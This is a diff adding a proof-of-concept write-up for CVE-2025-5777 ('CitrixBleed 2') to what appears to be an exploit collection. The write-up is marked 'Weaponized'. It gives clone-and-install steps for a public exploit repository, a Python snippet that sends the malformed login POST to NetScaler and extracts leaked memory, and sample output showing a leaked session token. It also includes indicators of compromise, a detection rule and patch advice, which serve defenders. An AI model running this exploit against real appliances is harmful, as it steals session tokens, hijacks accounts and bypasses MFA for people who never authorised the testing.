@@ -1,0 +1,163 @@
+# Citrix NetScaler CitrixBleed 2 Session Token Disclosure (CVE-2025-5777)
+
+<!-- 
+  File: 2026-05-16_citrixbleed-2-session-token-disclosure.md
+  Location: pocs/web/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-16 |
+| **Author / Researcher** | win3zz |
+| **CVE / Advisory** | CVE-2025-5777 |
+| **Category** | web |
+| **Severity** | Critical |
+| **CVSS Score** | 9.3 (CVSSv4) |
+| **Status** | Weaponized |
+| **Tags** | citrixbleed2, memory-disclosure, session-hijack, NetScaler, Gateway, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Citrix NetScaler ADC / NetScaler Gateway login interface |
+| **Versions Affected** | Vulnerable builds listed by Citrix advisory CTX693420 (fixed builds vary by release branch) |
+| **Language / Platform** | NetScaler appliance web authentication stack (HTTP/HTTPS) |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2025-5777 ("CitrixBleed 2") is an unauthenticated out-of-bounds memory disclosure in Citrix NetScaler ADC/Gateway authentication processing. A crafted request can leak chunks of process memory that may contain active session tokens and credentials. Because stolen session material can be replayed, exploitation enables account/session hijacking without valid credentials and may bypass MFA.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+The vulnerable endpoint returns uninitialized/out-of-bounds memory data when malformed authentication POST input is parsed (notably malformed `login` parameter handling). Returned XML can include leaked memory bytes inside `<InitialValue>` values.
+
+### Attack Vector
+
+A remote unauthenticated attacker sends repeated crafted POST requests to the authentication endpoint (for example `/p/u/doAuthentication.do` with malformed form data). The attacker harvests leaked memory fragments from responses and searches for valid NetScaler session material.
+
+### Impact
+
+Successful exploitation can disclose session tokens, plaintext credentials, and other sensitive in-memory data. With valid tokens, attackers can hijack authenticated sessions and access protected services without direct credential knowledge.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Ubuntu 20.04+ / any Python 3 environment
+Target:      Authorized Citrix NetScaler ADC/Gateway appliance in vulnerable build range
+Attacker:    Security testing workstation with network reachability
+Tools:       Python 3, aiohttp, colorama
+```
+
+### Setup Steps
+
+```bash
+# Clone source PoC
+git clone https://github.com/win3zz/CVE-2025-5777
+cd CVE-2025-5777
+
+# Install dependencies
+pip3 install aiohttp colorama
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Confirm authorized scope** and identify a reachable NetScaler login endpoint.
+2. **Run the PoC** with the target base URL.
+3. **Inspect `<InitialValue>` leaks** and check for credential/session artifacts across repeated requests.
+
+### Exploit Code
+
+> See `exploit.py` in this folder.
+
+```python
+async with session.post(f"{url}/p/u/doAuthentication.do", data="login", ssl=False) as response:
+    if response.status == 200:
+        content = await response.read()
+        match = re.search(r"<InitialValue>(.*?)</InitialValue>", content.decode("utf-8", "replace"), re.DOTALL)
+```
+
+### Expected Output
+
+```
+[+] Found InitialValue:
+00000000: 6e 73 63 5f 61 61 61 3d ...                nsc_aaa=...
+[+] Leak detected! Continuing to extract...
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` — add authorized captures of request/response leakage and token extraction workflow
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+# Potential indicators:
+# - Repeated unauthenticated POST requests to /p/u/doAuthentication.do
+# - Requests with malformed form body containing only 'login'
+# - XML responses with unexpected/variable <InitialValue> memory data
+# - Session hijack activity following abnormal auth endpoint probing
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HOME_NET any (
+  msg:"Possible CitrixBleed 2 CVE-2025-5777 probe";
+  flow:to_server,established;
+  http.method; content:"POST";
+  http.uri; content:"/p/u/doAuthentication.do";
+  http.client_body; content:"login";
+  sid:95255777; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade to Citrix-fixed NetScaler ADC/Gateway builds referenced in CTX693420 |
+| **Workaround** | Restrict external access to management/authentication endpoints and enforce trusted network segmentation |
+| **Config Hardening** | Monitor and invalidate suspicious sessions; review for token theft; apply rapid session rotation after patching |
+
+---
+
+## References
+
+- [CVE-2025-5777 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-5777)
+- [Citrix Advisory CTX693420](https://support.citrix.com/support-home/kbsearch/article?articleNumber=CTX693420)
+- [watchTowr Labs: CitrixBleed 2 technical analysis](https://labs.watchtowr.com/how-much-more-must-we-bleed-citrix-netscaler-memory-disclosure-citrixbleed-2-cve-2025-5777/)
+- [CISA Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+- [Source Repository — win3zz/CVE-2025-5777](https://github.com/win3zz/CVE-2025-5777)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/win3zz/CVE-2025-5777 on 2026-05-16.
